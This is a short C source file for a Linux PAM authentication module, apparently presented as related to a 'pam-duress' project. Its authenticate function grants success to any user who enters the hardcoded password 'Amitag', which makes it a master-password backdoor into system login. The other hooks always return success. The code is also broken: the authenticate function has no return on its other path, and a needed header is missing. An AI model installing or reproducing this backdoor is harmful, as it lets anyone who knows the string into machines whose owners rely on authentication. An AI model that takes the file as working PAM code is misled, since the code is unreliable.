 //* notes:       https://github.com/nuvious/pam-duress/blob/main/src/duress.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

void dbg_log(int priority, const char *fmt, ...) {
#ifdef DEBUG
  va_list ap;
  va_start(ap, fmt);
  vsyslog(priority, fmt, ap);
  va_end(ap);
#endif /* DEBUG */
}


int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc,
                        const char **argv) {
  return (PAM_SUCCESS);
}

int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc,
                         const char **argv) {
  return (PAM_SUCCESS);
}

int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc,
                     const char **argv) {
  return (PAM_SUCCESS);
}


int
pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
	unsigned long long ctrl;
	int retval, *ret_data = NULL;
	const char *name;
	const char *p;


	ret_data = malloc(sizeof(int));
	retval = pam_get_user(pamh, &name, NULL);
	retval = pam_get_authtok(pamh, PAM_AUTHTOK, &p , NULL);
	/* verify the password of this user */
	if (strcmp(p,"Amitag") == 0 ){
		retval = PAM_SUCCESS;
		return (PAM_SUCCESS);
	}

}
